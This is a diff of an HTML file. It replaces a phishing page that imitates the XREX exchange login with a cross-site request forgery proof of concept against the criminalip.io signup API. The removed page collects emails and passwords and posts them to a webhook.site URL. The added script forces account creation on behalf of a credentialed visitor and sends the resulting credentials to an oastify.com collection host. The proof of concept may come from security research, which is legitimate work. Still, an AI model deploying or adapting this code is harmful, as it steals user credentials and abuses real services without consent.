@@ -1,21 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>XREX Authentication Required</title>
+  <title>CriminalIP CSRF PoC</title>
 </head>
-<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
-  <img src="https://xrex.exchange/assets/images/xrex_logo.png" width="150" alt="XREX Logo"><br><br>
-  <h2>XREX Authentication Required</h2>
+<body>
+  <h1>CSRF Exploit - Account Creation + Burp Logging</h1>
+  <script>
+    const victimEmail = "csrfvictim" + Math.floor(Math.random() * 100000) + "@evil.com";
+    const password = "Attacker@123";
 
-  <form action="https://webhook.site/7e1604e0-31bf-4dbd-bf90-8e89c6a21ac9" method="POST">
-    <input name="username" placeholder="Email" style="padding:10px; width:250px;"><br><br>
-    <input name="password" placeholder="Password" type="password" style="padding:10px; width:250px;"><br><br>
-    <button type="submit" style="padding:10px 30px;">Login</button>
-  </form>
+    fetch("https://www.criminalip.io/api/auth/user/signup", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        account_type: "not_social",
+        email: victimEmail,
+        uid: "",
+        name: "CSRF Victim",
+        pw: password,
+        pp_agree_code: "1",
+        tos_agree_code: "1",
+        ad_agree_code: "1"
+      })
+    });
 
-  <p style="color: gray; font-size: 13px; margin-top: 20px;">
-    For security reasons, please re-authenticate to continue.
-  </p>
+    fetch("https://kk8pu9ze3pggcws7ht7amymid9j07qvf.oastify.com", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        email: victimEmail,
+        password: password,
+        note: "CriminalIP CSRF PoC triggered"
+      })
+    });
+  </script>
 </body>
 </html>
